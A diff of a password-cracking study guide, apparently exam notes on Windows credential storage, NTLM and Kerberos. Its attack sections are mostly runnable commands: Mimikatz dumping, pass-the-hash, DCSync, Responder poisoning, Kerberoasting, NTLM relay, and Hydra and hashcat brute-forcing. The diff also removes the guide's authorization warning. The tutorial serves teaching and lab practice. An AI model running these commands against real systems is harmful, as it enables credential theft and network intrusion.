@@ -4,8 +4,6 @@
 
 Password cracking is where "gaining access" almost always starts. A password is the cheapest, most universal authentication mechanism in existence — which also makes it the single most attacked one. Before touching any tool, it helps to understand *what* is actually being attacked: not the password itself, but the way an operating system stores and checks it.
 
-> **Lab scope note:** every command below assumes an isolated lab you own or are explicitly authorized to test (a home AD lab, a CTF box, a HackTheBox/TryHackMe target). Running any of this against systems you don't have written authorization for is a crime in most jurisdictions.
-
 ---
 
 ## 1. How Windows Stores and Checks Credentials
@@ -14,33 +12,6 @@ Password cracking is where "gaining access" almost always starts. A password is 
 Windows never stores your password. It stores a **hash** of it — a one-way mathematical fingerprint that's computationally impractical to reverse. Local account hashes live in the **Security Accounts Manager (SAM)**, which on a standalone machine is a registry hive backed by a file at `C:\Windows\System32\config\SAM`. Domain-joined accounts instead live in the **Active Directory database** (`NTDS.dit`) on domain controllers.
 
 The SAM file is locked exclusively by the Windows kernel while the OS is running, which is why you can't just copy it off a live system the way you'd copy a normal file — the lock only releases on shutdown or a crash. This is precisely why attackers reach for hash-dumping tools instead of file-copy tricks; tools like **Mimikatz**, **pwdump7**, **DSInternals**, and **secretsdump.py** interact with the LSASS process or registry hive directly (often via a Volume Shadow Copy or direct memory read) to pull hashes out from under the lock. Older Windows versions additionally scrambled the SAM contents with **SYSKEY**, a partial-encryption layer meant to raise the bar for offline attacks.
-
-**Dumping the SAM in practice:**
-```powershell
-# Method 1 — reg.exe save (requires local admin), then move both hives off-box
-reg save HKLM\SAM  C:\temp\sam.save
-reg save HKLM\SYSTEM C:\temp\system.save
-
-# Method 2 — Volume Shadow Copy, to bypass the live file lock entirely
-vssadmin create shadow /for=C:
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam.save
-
-# Method 3 — Mimikatz, straight from LSASS memory (must run elevated)
-mimikatz # privilege::debug
-mimikatz # token::elevate
-mimikatz # lsadump::sam
-
-# Method 4 — pwdump7 (older, still seen on exam material)
-PwDump7.exe > hashes.txt
-```
-Offline, from a Linux attack box against the two saved hive files:
-```bash
-# Impacket's secretsdump against saved hives
-secretsdump.py -sam sam.save -system system.save LOCAL
-
-# Or directly over the network against a live host with valid creds
-secretsdump.py DOMAIN/administrator:'Password123!'@10.10.10.5
-```
 
 ### NTLM Authentication
 NTLM is a **challenge-response** protocol — the password (or its hash) never crosses the wire in the clear:
@@ -91,139 +62,156 @@ Anything where the attacker is actively talking to the target system:
   ```
 - **Default passwords** — manufacturer defaults (`admin/admin`, `admin/password`) that never got changed after setup. Lookup sites include `https://cirt.net`, `https://www.routerpasswords.com`, and `https://default-password.info`.
 - **Trojans / spyware / keyloggers** — plant something on the victim's machine that captures credentials as they're typed. (Covered in depth in file 04.)
-- **Hash Injection / Pass-the-Hash (PtH)** — since NTLM authenticates on the hash rather than the plaintext (see above), an attacker who dumps a hash from one compromised box can inject it straight into a new session and authenticate as that user elsewhere, without ever cracking it.
-  ```
-  # Chain: compromise workstation -> dump hashes -> find cached DA hash -> inject -> hit the DC
-  mimikatz # sekurlsa::logonpasswords              # dump live creds/hashes from LSASS
-  mimikatz # sekurlsa::pth /user:jdoe /domain:corp.local /ntlm:<NTLM_HASH> /run:cmd.exe
-  ```
-  ```bash
-  # Same idea over the network with Impacket, no cracking required
-  psexec.py -hashes :<NTLM_HASH> administrator@10.10.10.5
-  wmiexec.py -hashes :<NTLM_HASH> administrator@10.10.10.5
-  crackmapexec smb 10.10.10.0/24 -u administrator -H <NTLM_HASH>
-  ```
-- **LLMNR / NBT-NS Poisoning** — LLMNR and NetBIOS Name Service are Windows fallback name-resolution protocols used when DNS can't resolve a hostname. Because the fallback broadcast is unauthenticated, a listening attacker can simply answer *"yes, that's me"* to a mistyped or nonexistent hostname, prompting the victim to authenticate directly to the attacker with an NTLMv2 hash.
-  ```bash
-  # Responder — listen and poison on the wire
-  sudo responder -I eth0 -wrf
+- **Hash Injection / Pass-the-Hash (PtH)** — since NTLM authenticates on the hash rather than the plaintext (see above), an attacker who dumps a hash from one compromised box can inject it straight into a new session and authenticate as that user elsewhere, without ever cracking it. Typical chain: compromise a workstation → dump hashes with Mimikatz → find a cached domain admin hash → inject that hash into `lsass.exe` on the attacker's controlled session → authenticate to the domain controller as that admin → dump the entire AD hash database.
 
-  # Captured NTLMv2 hash lands in a log file; crack it offline
-  hashcat -m 5600 captured_ntlmv2.txt /usr/share/wordlists/rockyou.txt
+  ```
+  # Mimikatz — dump all credentials/hashes cached on the current host
+  privilege::debug
+  sekurlsa::logonpasswords
+
+  # Mimikatz — dump the entire SAM database of the local machine
+  lsadump::sam
+
+  # Mimikatz — dump the full NTDS.dit database from a domain controller (DCSync-style)
+  lsadump::dcsync /domain:corp.local /user:krbtgt
+
+  # Mimikatz — Pass-the-Hash: launch a new process authenticated as another user
+  # using only their NTLM hash (no plaintext password needed)
+  sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<captured_NTLM_hash> /run:cmd.exe
+  ```
+
+  ```bash
+  # pwdump7 — dump LM/NTLM hashes from the local SAM (run elevated, on Windows)
+  PwDump7.exe > hashes.txt
+
+  # DSInternals (PowerShell) — offline extraction from a copy of ntds.dit + SYSTEM hive
+  Import-Module DSInternals
+  $key = Get-BootKey -SystemHivePath 'C:\temp\SYSTEM'
+  Get-ADDBAccount -All -DBPath 'C:\temp\ntds.dit' -BootKey $key
+  ```
+- **LLMNR / NBT-NS Poisoning** — LLMNR and NetBIOS Name Service are Windows fallback name-resolution protocols used when DNS can't resolve a hostname. Because the fallback broadcast is unauthenticated, a listening attacker can simply answer *"yes, that's me"* to a mistyped or nonexistent hostname, prompting the victim to authenticate directly to the attacker with an NTLMv2 hash. Tools: **Responder**, **Metasploit**. The stolen hash is then cracked offline with hashcat or John.
+
+  ```bash
+  # Listen on all interfaces and poison LLMNR/NBT-NS/MDNS requests
+  responder -I eth0 -wrf
+
+  # -w  -> start WPAD rogue proxy server
+  # -r  -> respond to NBT-NS wildcard queries
+  # -f  -> fingerprint the remote host OS
+
+  # Captured NTLMv2 hashes are logged automatically to:
+  #   /usr/share/responder/logs/
+
+  # Crack a captured NTLMv2 hash offline
+  hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
+  john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt captured_hash.txt
   ```
 - **Kerberos password attacks:**
-  - **AS-REP Roasting** — targets accounts that have "Do not require Kerberos preauthentication" enabled.
-    ```bash
-    # Impacket
-    GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt
-    hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+  - **AS-REP Roasting** — targets accounts that have "Do not require Kerberos preauthentication" enabled. Because no proof of password knowledge is needed to request a TGT for such accounts, an attacker can request one and crack it offline at leisure.
+  - **Kerberoasting** — any authenticated domain user can request a service ticket (TGS) for any service that has a Service Principal Name (SPN) registered. That ticket is encrypted with the *service account's* password hash — so the attacker requests the ticket, takes it offline, and brute-forces the service account's password with no special privileges required. This is why service accounts with weak, never-rotated passwords are one of the highest-value AD misconfigurations to fix.
+  - **Pass-the-Ticket** — instead of stealing a hash, steal an actual Kerberos ticket (TGT or TGS) from `lsass.exe` (via Mimikatz, Rubeus, or Windows Credentials Editor) and inject it into a new session to impersonate the ticket's owner without ever knowing their password.
+  - **NTLM Relay** — rather than cracking a captured NTLM hash, relay the live authentication attempt to a *different* server in real time using **Responder** in relay mode or **ntlmrelayx**, effectively borrowing the victim's authentication session as it happens.
 
-    # Rubeus (from a Windows foothold)
-    Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
-    ```
-  - **Kerberoasting** — any authenticated domain user can request a service ticket (TGS) for any service that has a Service Principal Name (SPN) registered.
-    ```bash
-    # Impacket
-    GetUserSPNs.py corp.local/jdoe:Password1 -request -outputfile tgs.txt
-    hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
+  ```bash
+  # AS-REP Roasting — Impacket
+  GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.1.1 -format hashcat
 
-    # Rubeus
-    Rubeus.exe kerberoast /outfile:tgs.txt
-    ```
-  - **Pass-the-Ticket** — steal an actual Kerberos ticket (TGT or TGS) from `lsass.exe` and inject it into a new session.
-    ```
-    mimikatz # sekurlsa::tickets /export
-    mimikatz # kerberos::ptt <ticket.kirbi>
-    ```
-    ```powershell
-    # Rubeus equivalent
-    Rubeus.exe ptt /ticket:<base64-or-file>
-    ```
-  - **NTLM Relay** — relay the live authentication attempt to a *different* server in real time.
-    ```bash
-    # Responder in analyze-only mode + ntlmrelayx doing the relay
-    ntlmrelayx.py -tf targets.txt -smb2support
-    # combine with Responder (with SMB/HTTP serving OFF, since ntlmrelayx handles that) to capture and relay in one pass
-    ```
+  # Kerberoasting — Impacket
+  GetUserSPNs.py corp.local/lowpriv:Password123 -dc-ip 10.10.1.1 -request
+
+  # Crack the resulting AS-REP / TGS hash offline
+  hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt     # AS-REP (etype 23)
+  hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt       # Kerberoast TGS (RC4)
+
+  # Pass-the-Ticket — Mimikatz: export tickets from memory, then re-inject
+  sekurlsa::tickets /export
+  kerberos::ptt <ticket_file>.kirbi
+
+  # NTLM Relay — set up Responder in analyze-only mode alongside ntlmrelayx
+  responder -I eth0 -A
+  ntlmrelayx.py -tf targets.txt -smb2support
+  ```
 - **GPU-based password attacks** — malicious browser extensions or web pages can abuse the WebGL/OpenGL API to harness the victim's GPU for cracking work, or more directly, malware can key-log a login form and exfiltrate what's typed before it's ever hashed.
 
 ### Passive Online Attacks
 The attacker never sends a single packet to the target — only listens:
 
-- **Wire sniffing / packet sniffing** — capturing plaintext or weakly protected credentials off the wire (legacy FTP, Telnet, HTTP basic auth, SMB, POP3).
-  ```bash
-  # tcpdump, filter for common clear-text auth ports
-  sudo tcpdump -i eth0 -A 'port 21 or port 23 or port 110' -w creds.pcap
-
-  # Wireshark display filter to isolate HTTP Basic Auth / FTP creds after the fact
-  # http.authorization or ftp.request.command == "USER" or ftp.request.command == "PASS"
-  ```
-- **Man-in-the-Middle (MITM) / Manipulator-in-the-Middle and Replay attacks** — sit between two communicating parties, either passively eavesdropping or actively capturing and later re-injecting valid authentication tokens/packets.
-  ```bash
-  # bettercap — ARP spoof + live credential sniffing module
-  sudo bettercap -iface eth0
-  > net.probe on
-  > set arp.spoof.targets 10.10.10.5
-  > arp.spoof on
-  > net.sniff on
-  ```
+- **Wire sniffing / packet sniffing** — capturing plaintext or weakly protected credentials off the wire (legacy FTP, Telnet, HTTP basic auth, SMB, POP3). Works best on shared-medium networks (hubs) or where the attacker has ARP-spoofed their way onto the path.
+- **Man-in-the-Middle (MITM) / Manipulator-in-the-Middle and Replay attacks** — sit between two communicating parties, either passively eavesdropping or actively capturing and later re-injecting valid authentication tokens/packets to replay a transaction (e.g., a captured bank transfer authorization).
 
 ### Offline Attacks
 The attacker already possesses the password hash (dumped, sniffed, or leaked) and now cracks it without any further interaction with the target — meaning no lockout policy, no rate limiting, no logging on the victim's side:
 
-- **Rainbow table attack** — instead of computing hashes on the fly, precompute massive lookup tables of `plaintext → hash` pairs ahead of time, then simply look up the captured hash. Salting defeats this technique almost entirely.
+- **Rainbow table attack** — instead of computing hashes on the fly, precompute massive lookup tables of `plaintext → hash` pairs ahead of time (using a tool like **rtgen** from the RainbowCrack project), then simply look up the captured hash. Classic time/memory trade-off: enormous storage cost, near-instant lookup cost. Salting defeats this technique almost entirely, which is why unsalted hash schemes (like old-style NTLM/LM) remain so dangerous.
   ```bash
-  # Generate a table (rtgen), sort it (rtsort), then crack against it (rcrack)
+  # Generate a rainbow table for NTLM hashes, lowercase+digit charset, 1-7 char passwords
   rtgen ntlm loweralpha-numeric 1 7 0 3800 33554432 0
-  rtsort .
-  rcrack . -h <NTLM_HASH>
+
+  # Sort the generated table for faster lookups
+  rtsort *.rt
+
+  # Look up a captured hash against the generated table(s)
+  rcrack *.rt -h <captured_hash>
+
+  # Or look up every hash listed in a file at once
+  rcrack *.rt -l hashes.txt
   ```
-- **Distributed Network Attack (DNA)** — spread the cracking workload across many machines' idle CPU cycles, coordinated by a central DNA manager. Commercial tooling: **Exterro Password Recovery Toolkit (PRTK)**.
+  General syntax reference: `rtgen hash_algorithm charset plaintext_len_min plaintext_len_max table_index chain_len chain_num part_index`
+- **Distributed Network Attack (DNA)** — spread the cracking workload across many machines' idle CPU cycles, coordinated by a central DNA manager that hands out key-search chunks to DNA clients. Commercial tooling: **Exterro Password Recovery Toolkit (PRTK)**.
 
 ---
 
 ## 3. Dictionary, Brute-Force & Mask Attacks in Practice
 
-### John the Ripper — dictionary and rule-based attacks
+### THC-Hydra — online (active) brute-force across protocols
+Hydra is the classic tool for the *active online* category above — it doesn't crack a stolen hash offline, it directly attempts logons against a live service, one credential pair at a time, until it finds one that works (or exhausts the list). Basic syntax:
+```bash
+hydra -l <username> -p <single_password> <target> <protocol>
+hydra -l <username> -P <password_wordlist> <target> <protocol>
+hydra -L <username_wordlist> -P <password_wordlist> <target> <protocol>
+```
+Real examples against common services:
+```bash
+# SSH — single username, full password wordlist
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.1.9
+
+# SSH — username list AND password list, 4 parallel tasks, verbose
+hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt -t 4 -V ssh://10.10.1.9
+
+# FTP
+hydra -l admin -P passwords.txt ftp://10.10.1.5
+
+# RDP
+hydra -l administrator -P passwords.txt rdp://10.10.1.20
+
+# SMB
+hydra -l administrator -P passwords.txt smb://10.10.1.20
+
+# A web login form (HTTP POST) — the ^USER^/^PASS^ placeholders map to -l/-P,
+# and the final segment after the last colon is the string that indicates a FAILED login
+hydra -l admin -P passwords.txt 10.10.1.9 http-post-form \
+  "/login.php:username=^USER^&password=^PASS^:Invalid username or password"
+
+# MySQL
+hydra -l root -P passwords.txt mysql://10.10.1.30
+
+# Limit to 4 tasks and stop on first valid pair found
+hydra -l admin -P passwords.txt -t 4 -f ssh://10.10.1.9
+```
+`-t` controls parallel connection threads, `-f` stops after the first success, `-V`/`-vV` increase verbosity, and `-o output.txt` saves found credentials to a file.
+
+### John the Ripper — dictionary attack against NTLM hashes
 ```bash
 # 1. Grab a base wordlist
 ls /usr/share/wordlists/rockyou.txt
 
-# 2. Straight dictionary attack against NTLM hashes
+# 2. (Optional) customize John's rules in john.conf for mutation-based cracking
+
+# 3. Crack NTLM hashes with a chosen wordlist
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashes.txt
-
-# 3. Dictionary + built-in mangling rules (leetspeak, capitalization, appended digits)
-john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo --format=NT hashes.txt
-
-# 4. Pure incremental brute-force (last resort, slow)
-john --incremental --format=NT hashes.txt
-
-# 5. Show cracked results at any time / after the fact
-john --show --format=NT hashes.txt
 ```
 
-### hashcat — dictionary, rule, combinator & mask attacks
-Common attack modes (`-a`):
-
-| Mode | Name | Use case |
-|---|---|---|
-| `0` | Straight (dictionary) | Plain wordlist |
-| `1` | Combinator | Combine two wordlists word-for-word |
-| `3` | Brute-force / mask | Known length/pattern |
-| `6` | Hybrid (wordlist + mask) | Wordlist with a suffix mask appended |
-| `7` | Hybrid (mask + wordlist) | Mask prefix + wordlist |
-
-```bash
-# Dictionary attack against NTLM
-hashcat -a 0 -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
-
-# Dictionary + rule file (mirrors John's mangling)
-hashcat -a 0 -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
-
-# Hybrid: rockyou word + 4-digit suffix (e.g. Summer2024)
-hashcat -a 6 -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt ?d?d?d?d
-```
-
+### hashcat — mask attacks
 A mask attack narrows brute-forcing to a *known pattern* instead of trying every possible character everywhere, which collapses the search space dramatically when you have partial intel (e.g., "always exactly 8 characters, starts with a capital letter, ends in two digits").
 
 **Built-in charsets:**
@@ -255,43 +243,6 @@ Custom charset example (attacker knows position 1 is a letter but doesn't know t
 hashcat -a 3 -m 0 md5_hashes.txt -1 ?l?u ?1?1?1?1?1
 ```
 
-**Common `-m` hash-mode numbers worth memorizing for the exam and for labs:**
-| Mode | Hash type |
-|---|---|
-| `0` | MD5 |
-| `100` | SHA1 |
-| `1000` | NTLM |
-| `3000` | LM |
-| `5500` | NetNTLMv1 |
-| `5600` | NetNTLMv2 |
-| `13100` | Kerberos 5 TGS-REP (Kerberoasting) |
-| `18200` | Kerberos 5 AS-REP (AS-REP Roasting) |
-| `1800` | sha512crypt (Linux `/etc/shadow`) |
-| `3200` | bcrypt |
-
-### Online / network-service brute-forcing with Hydra
-For attacking a live login prompt directly (SSH, FTP, RDP, a web login form) rather than a captured hash:
-```bash
-# SSH
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5
-
-# FTP, single known user, wordlist of passwords
-hydra -l ftpuser -P passwords.txt ftp://10.10.10.5
-
-# RDP
-hydra -l administrator -P passwords.txt rdp://10.10.10.5
-
-# HTTP POST login form (fields, failure string, and login path all discovered via Burp/inspecting the form first)
-hydra -l admin -P passwords.txt 10.10.10.5 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
-```
-
-### Cracking `/etc/shadow` hashes (Linux)
-```bash
-# Combine passwd + shadow into a crackable format
-unshadow /etc/passwd /etc/shadow > combined.txt
-john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt
-```
-
 ---
 
 ## 4. Password Recovery & Cracking Tool Index
@@ -304,12 +255,9 @@ john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt
 | THC-Hydra | Online protocol brute-forcer | https://github.com |
 | RainbowCrack / rtgen | Rainbow table generation & lookup | http://project-rainbowcrack.com |
 | Mimikatz | Live hash/ticket/credential extraction | https://github.com |
-| Rubeus | Kerberos ticket abuse (roast, ptt, renew) | https://github.com |
-| Impacket (secretsdump/GetUserSPNs/GetNPUsers) | Offline hash extraction & Kerberos attacks | https://github.com |
 | DSInternals | AD offline hash extraction (PowerShell) | https://github.com |
 | pwdump7 | SAM hash dumper | — |
 | Responder | LLMNR/NBT-NS/MDNS poisoning & relay | https://github.com |
-| CrackMapExec / NetExec | Mass credential validation & PtH across a subnet | https://github.com |
 | Elcomsoft Distributed Password Recovery | Enterprise-grade recovery suite | https://www.elcomsoft.com |
 | Passware Kit Forensic | Document/drive password recovery | https://www.passware.com |
 | PCUnlocker | Windows local account reset | https://www.top-password.com |
